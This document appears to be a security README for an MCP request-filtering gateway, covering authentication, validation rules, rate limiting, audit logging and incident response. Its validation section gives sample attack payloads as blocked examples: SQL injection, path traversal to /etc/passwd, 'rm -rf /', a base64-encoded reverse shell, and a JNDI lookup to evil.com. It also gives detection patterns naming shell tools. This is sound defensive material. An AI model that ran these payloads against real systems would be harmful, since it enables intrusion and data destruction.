# Security Guide - MCP Security Gateway

## Overview

The MCP Security Gateway is designed to protect MCP (Model Context Protocol) communications from common security vulnerabilities. This guide explains the security features, best practices, and threat mitigation strategies.

## 🛡️ Security Features

### 1. Authentication & Authorization

#### JWT-Based Authentication
- **Algorithm**: HS256 (HMAC with SHA-256)
- **Token Lifetime**: Configurable (default 24 hours)
- **Secure Storage**: Tokens should be stored securely on client side

**Best Practices:**
```bash
# Use strong, randomly generated secrets (minimum 32 bytes)
python -c "import secrets; print(secrets.token_urlsafe(32))"

# Rotate JWT secrets regularly (recommended: every 90 days)
# Use environment variables, never commit secrets to git
```

#### Role-Based Access Control (RBAC)
- **Admin users**: Full access to all servers and admin endpoints
- **Regular users**: Restricted by user_permissions table
- **Granular permissions**: read, write, execute per MCP server

**Configuration Example:**
```sql
-- Grant read-only access to database server
INSERT INTO user_permissions (user_id, server_id, can_read, can_write, can_execute)
VALUES (2, 1, true, false, false);
```

### 2. Request Validation

The gateway validates all requests against multiple attack vectors:

#### SQL Injection Prevention

**Detected Patterns:**
- DDL commands: `DROP`, `TRUNCATE`, `ALTER`
- Destructive DML: `DELETE FROM`, `UPDATE ... WHERE`
- Comment-based evasion: `--`, `/*`, `*/`
- Union-based injection: `UNION SELECT`
- Boolean-based: `OR 1=1`, `AND 1=1`
- Information disclosure: `INFORMATION_SCHEMA`

**Example Blocked Request:**
```json
{
  "method": "database.query",
  "params": {
    "sql": "SELECT * FROM users WHERE id = 1 OR 1=1"
  }
}
// Blocked: "SQL Injection: Detected SQL injection pattern: OR 1=1"
```

**Safe Alternatives:**
```python
# Always use parameterized queries on the MCP server side
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

#### Path Traversal Prevention

**Detected Patterns:**
- Directory traversal: `../`, `..\\`
- URL encoding: `%2e%2e/`, `%252e%252e/`
- Absolute paths to sensitive files: `/etc/passwd`, `/etc/shadow`
- Windows paths: `C:\\Windows\\System32`
- Home directory: `~/`

**Example Blocked Request:**
```json
{
  "method": "filesystem.read",
  "params": {
    "path": "../../etc/passwd"
  }
}
// Blocked: "Path Traversal: Detected path traversal pattern: ../"
```

**Safe Alternatives:**
```python
# Use whitelisted base directories
import os

ALLOWED_BASE = "/var/www/data"
requested_path = os.path.normpath(os.path.join(ALLOWED_BASE, user_path))

# Ensure path is within allowed base
if not requested_path.startswith(ALLOWED_BASE):
    raise PermissionError("Access denied")
```

#### Command Injection Prevention

**Detected Patterns:**
- Command separators: `;`, `|`, `&&`, `||`
- Command substitution: `$(...)`, `` `...` ``
- Redirection: `>`, `<`
- Dangerous commands: `rm`, `dd`, `bash`, `wget`, `curl`

**Example Blocked Request:**
```json
{
  "method": "system.execute",
  "params": {
    "command": "ls -la; rm -rf /"
  }
}
// Blocked: "Command Injection: Detected command injection pattern: ;"
```

**Safe Alternatives:**
```python
# Use subprocess with shell=False and argument list
import subprocess

# SAFE: Arguments passed as list
subprocess.run(["ls", "-la", directory], shell=False)

# UNSAFE: Shell interpretation enabled
# subprocess.run(f"ls -la {directory}", shell=True)  # DON'T DO THIS
```

#### Base64 Exploit Detection

**Detection Logic:**
- Identifies base64-encoded strings (20+ chars)
- Decodes and scans for exploit keywords: `bash`, `sh`, `exec`, `wget`, `curl`

**Example Blocked Request:**
```json
{
  "method": "process.data",
  "params": {
    "data": "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjE="
    // Decodes to: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
  }
}
// Blocked: "Base64 Exploit: Detected base64 encoded exploit: bash"
```

#### JNDI Injection Prevention (Log4Shell)

**Detected Patterns:**
- `${jndi:ldap://...}`
- `${jndi:rmi://...}`
- `${jndi:dns://...}`

**Example Blocked Request:**
```json
{
  "method": "logger.log",
  "params": {
    "message": "${jndi:ldap://evil.com/a}"
  }
}
// Blocked: "JNDI Injection: Detected JNDI injection pattern: ${jndi:"
```

### 3. Rate Limiting

#### Token Bucket Algorithm

**Configuration:**
```yaml
# Per-user rate limits
rate_limiting:
  default_requests: 100
  default_period: 3600  # 1 hour
```

**Database Configuration:**
```sql
-- Custom rate limit for specific user-server combination
UPDATE user_permissions
SET rate_limit = 1000, rate_limit_period = 3600
WHERE user_id = 1 AND server_id = 1;
```

**Rate Limit Headers:**
```
HTTP/1.1 429 Too Many Requests
Content-Type: application/json

{
  "jsonrpc": "2.0",
  "error": {
    "code": -32002,
    "message": "Rate limit exceeded",
    "data": "Limit: 100 requests per 3600 seconds"
  }
}
```

### 4. Audit Logging

#### What Gets Logged

Every request logs:
- Timestamp (UTC)
- User ID and username
- MCP server and method
- Request parameters (PII-masked)
- Response status and time
- Blocked status and reason
- Client IP and user agent
- Unique request ID

**Example Audit Log:**
```json
{
  "id": 12345,
  "timestamp": "2025-01-15T14:30:00Z",
  "user_id": 42,
  "username": "john.doe",
  "server_name": "company-database",
  "method": "query",
  "params": {"sql": "SELECT * FROM products"},
  "response_status": 200,
  "response_time_ms": 15.3,
  "blocked": false,
  "client_ip": "10.0.1.50",
  "request_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
}
```

#### PII Detection and Masking

**Automatically Detected PII:**
- Email addresses → `[EMAIL]`
- SSN (US format) → `[SSN]`
- Credit card numbers → `[CREDIT_CARD]`
- Phone numbers → `[PHONE]`
- IP addresses → `[IP_ADDRESS]`

**Configuration:**
```bash
# Enable/disable PII detection
PII_DETECTION_ENABLED=true
```

#### Log Retention

**Default Policy:** 30 days

```sql
-- Manual cleanup
DELETE FROM audit_logs WHERE timestamp < NOW() - INTERVAL '30 days';

-- Automated cleanup (runs daily via cron/scheduler)
SELECT cleanup_old_audit_logs(30);  -- 30 days retention
```

### 5. Security Alerts

#### Alert Severity Levels

1. **Critical** - Command injection, remote code execution attempts
2. **High** - SQL injection, path traversal to sensitive files
3. **Medium** - Base64 exploits, JNDI injection
4. **Low** - Custom pattern violations, rate limit exceeded

#### Alert Storage

```sql
-- View unacknowledged high-severity alerts
SELECT * FROM security_alerts
WHERE acknowledged = false AND severity IN ('high', 'critical')
ORDER BY timestamp DESC;

-- Acknowledge alert
UPDATE security_alerts
SET acknowledged = true,
    acknowledged_by = 1,
    acknowledged_at = NOW()
WHERE id = 123;
```

## 🔐 Production Security Checklist

### Before Deployment

- [ ] Change default admin password
- [ ] Generate strong JWT secret (32+ bytes)
- [ ] Configure TLS/SSL (use reverse proxy)
- [ ] Set up firewall rules
- [ ] Enable audit logging
- [ ] Configure PII detection
- [ ] Set appropriate rate limits
- [ ] Review blocked patterns
- [ ] Set up log monitoring/alerts
- [ ] Configure backup for PostgreSQL
- [ ] Enable database encryption at rest
- [ ] Set up Redis password authentication
- [ ] Configure CORS appropriately
- [ ] Disable debug mode
- [ ] Set up health check monitoring
- [ ] Configure log rotation
- [ ] Enable Prometheus metrics scraping
- [ ] Set up incident response plan
- [ ] Document disaster recovery procedures

### Environment Variables (Production)

```bash
# Strong secrets (never use defaults)
JWT_SECRET=<64-char-random-string>
DATABASE_URL=postgresql://user:strong-password@db:5432/mcp_gateway
REDIS_URL=redis://:redis-password@redis:6379/0

# Secure settings
LOG_LEVEL=WARNING  # Don't log sensitive debug info
PII_DETECTION_ENABLED=true
AUDIT_LOG_RETENTION_DAYS=90  # Compliance requirement

# Network security
GATEWAY_HOST=0.0.0.0  # Bind to all interfaces (behind firewall)
GATEWAY_PORT=8000

# CORS (restrict to your domain)
ALLOWED_ORIGINS=https://your-domain.com
```

### Database Security

```sql
-- Use strong password for database user
ALTER USER mcp_user WITH PASSWORD 'very-strong-random-password';

-- Restrict database permissions
REVOKE ALL ON DATABASE mcp_gateway FROM PUBLIC;
GRANT CONNECT ON DATABASE mcp_gateway TO mcp_user;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO mcp_user;

-- Enable row-level security (optional, for multi-tenancy)
ALTER TABLE audit_logs ENABLE ROW LEVEL SECURITY;
CREATE POLICY user_audit_logs ON audit_logs
  FOR SELECT
  USING (user_id = current_setting('app.current_user_id')::int);
```

### Network Security

```nginx
# Nginx reverse proxy with security headers
server {
    listen 443 ssl http2;
    server_name gateway.example.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Rate limiting at nginx level
    limit_req_zone $binary_remote_addr zone=gateway:10m rate=10r/s;
    limit_req zone=gateway burst=20 nodelay;

    location / {
        proxy_pass http://localhost:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

## 🚨 Incident Response

### Detecting Attacks

**Monitor for:**
1. High rate of blocked requests from single IP
2. Multiple critical security alerts
3. Repeated authentication failures
4. Unusual traffic patterns
5. Access to sensitive MCP servers outside business hours

**Alert Examples:**
```sql
-- Users with > 10 blocked requests in last hour
SELECT username, COUNT(*) as blocked_count
FROM audit_logs
WHERE blocked = true
  AND timestamp > NOW() - INTERVAL '1 hour'
GROUP BY username
HAVING COUNT(*) > 10;

-- Critical alerts in last 24 hours
SELECT COUNT(*) FROM security_alerts
WHERE severity = 'critical'
  AND timestamp > NOW() - INTERVAL '24 hours';
```

### Response Procedures

1. **Immediate Actions**
   - Block offending IP addresses at firewall
   - Disable compromised user accounts
   - Review audit logs for scope of breach
   - Rotate JWT secrets if necessary

2. **Investigation**
   - Export relevant audit logs
   - Identify attack vector and entry point
   - Determine data accessed or modified
   - Document timeline of events

3. **Remediation**
   - Patch vulnerabilities
   - Update blocked patterns
   - Strengthen authentication requirements
   - Implement additional monitoring

4. **Post-Incident**
   - Conduct security review
   - Update incident response procedures
   - Inform affected parties if required
   - Implement preventive measures

### Emergency Commands

```bash
# Disable user immediately
docker-compose exec postgres psql -U mcp_user -d mcp_gateway \
  -c "UPDATE users SET is_active = false WHERE username = 'compromised-user';"

# Block IP at firewall
sudo iptables -A INPUT -s 1.2.3.4 -j DROP

# Force JWT secret rotation (invalidates all tokens)
# 1. Generate new secret
python -c "import secrets; print(secrets.token_urlsafe(32))"

# 2. Update .env file with new secret
# 3. Restart gateway
docker-compose restart gateway

# Export audit logs for investigation
docker-compose exec postgres psql -U mcp_user -d mcp_gateway \
  -c "\COPY (SELECT * FROM audit_logs WHERE timestamp > NOW() - INTERVAL '24 hours') TO STDOUT CSV HEADER" \
  > incident-audit-logs.csv
```

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://www.sans.org/top25-software-errors/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [MCP Protocol Specification](https://github.com/anthropics/mcp)

## 🐛 Reporting Security Vulnerabilities

If you discover a security vulnerability:

1. **DO NOT** create a public GitHub issue
2. Email security@example.com with details
3. Include steps to reproduce
4. We'll respond within 48 hours
5. We'll credit you in the security advisory (if desired)

---

**Security is everyone's responsibility. Stay vigilant!**
